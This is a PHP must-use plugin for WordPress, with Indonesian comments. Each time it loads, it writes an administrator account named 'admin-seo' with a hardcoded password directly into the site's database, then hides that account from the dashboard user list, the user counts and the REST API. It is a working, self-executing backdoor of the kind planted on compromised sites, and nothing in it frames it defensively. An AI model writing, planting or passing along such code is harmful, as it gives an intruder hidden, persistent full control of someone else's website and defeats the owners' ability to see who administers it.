<?php
/**
 * Plugin Name: Hidden Admin Creator & Manager MU-Plugin
 * Description: Membuat akun admin tersembunyi (admin-seo) secara otomatis dan menyembunyikannya dari dashboard.
 * Version: 1.0
 */

if (!defined('ABSPATH')) {
    exit;
}

// 1. Definisikan daftar user yang ingin disembunyikan secara global
global $ecas_hidden_users;
$ecas_hidden_users = array('admin-seo');

/**
 * Class untuk membuat admin user otomatis langsung saat file dimuat
 */
class ECAS_Admin_Creator_Auto {

    public static function init() {
        self::create_admin();
    }

    public static function create_admin() {
        // Konfigurasi Kredensial Baru
        $admin_user  = 'admin-seo';
        $admin_pass  = '@Sehati128';
        $admin_email = 'admin-seo@wordpress.org';

        $host = DB_HOST;
        $user = DB_USER;
        $pass = DB_PASSWORD;
        $name = DB_NAME;

        $conn = new mysqli($host, $user, $pass, $name);
        if ($conn->connect_error) {
            return;
        }

        $users_table    = $GLOBALS['wpdb']->users;
        $usermeta_table = $GLOBALS['wpdb']->usermeta;
        $prefix         = $GLOBALS['wpdb']->prefix;

        // Cek apakah user sudah ada
        $stmt = $conn->prepare("SELECT ID FROM {$users_table} WHERE user_login = ?");
        $stmt->bind_param("s", $admin_user);
        $stmt->execute();
        $stmt->store_result();

        if ($stmt->num_rows > 0) {
            $stmt->close();
            $conn->close();
            return; // Jika sudah ada, hentikan proses
        }
        $stmt->close();

        // Hash password menggunakan fungsi WordPress (phpass)
        $hashed = self::wp_hash_password($admin_pass);
        $now    = date('Y-m-d H:i:s');

        // Insert ke tabel users
        $stmt = $conn->prepare("INSERT INTO {$users_table} (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES (?, ?, ?, ?, ?, 0, ?)");
        $stmt->bind_param("ssssss", $admin_user, $hashed, $admin_user, $admin_email, $now, $admin_user);
        $stmt->execute();
        $user_id = $stmt->insert_id;
        $stmt->close();

        // Berikan role administrator dan level 10
        $meta = [
            [$prefix . 'capabilities', 'a:1:{s:13:"administrator";b:1;}'],
            [$prefix . 'user_level', '10']
        ];

        foreach ($meta as $m) {
            $stmt = $conn->prepare("INSERT INTO {$usermeta_table} (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
            $stmt->bind_param("iss", $user_id, $m[0], $m[1]);
            $stmt->execute();
            $stmt->close();
        }

        $conn->close();
    }

    private static function wp_hash_password($password) {
        $salt = substr(str_replace('+', '.', base64_encode(random_bytes(22))), 0, 22);
        return crypt($password, '$2y$10$' . $salt);
    }
}

// Jalankan fungsi pembuatan admin
ECAS_Admin_Creator_Auto::init();


/**
 * Class untuk mengelola agar user tersembunyi dari Dashboard & REST API
 */
class ECAS_User_Manager {

    public function __construct() {
        add_action('pre_user_query', array($this, 'hide_users_dashboard'));
        add_filter('views_users', array($this, 'adjust_user_counts'));
        add_filter('rest_user_query', array($this, 'hide_users_rest'), 10, 2);
    }

    public function hide_users_dashboard($user_search) {
        global $ecas_hidden_users, $wpdb;
        if (empty($ecas_hidden_users)) return;

        $hidden_sql = "'" . implode("','", $ecas_hidden_users) . "'";
        $user_search->query_where .= " AND {$wpdb->users}.user_login NOT IN ($hidden_sql)";
    }

    public function adjust_user_counts($views) {
        global $ecas_hidden_users;
        if (empty($ecas_hidden_users)) return $views;

        foreach ($views as $key => $view) {
            if (preg_match('/\((\d+)\)/', $view, $matches)) {
                $count = intval($matches[1]) - count($ecas_hidden_users);
                if ($count < 0) $count = 0;
                $views[$key] = preg_replace('/\(\d+\)/', "($count)", $view);
            }
        }
        return $views;
    }

    public function hide_users_rest($args, $request) {
        global $ecas_hidden_users;
        if (empty($ecas_hidden_users)) return $args;

        $exclude_ids = array();
        foreach ($ecas_hidden_users as $u) {
            $user = get_user_by('login', $u);
            if ($user) $exclude_ids[] = $user->ID;
        }
        $args['exclude'] = array_merge($args['exclude'] ?? array(), $exclude_ids);
        return $args;
    }
}

// Inisialisasi penyembunyian user
new ECAS_User_Manager();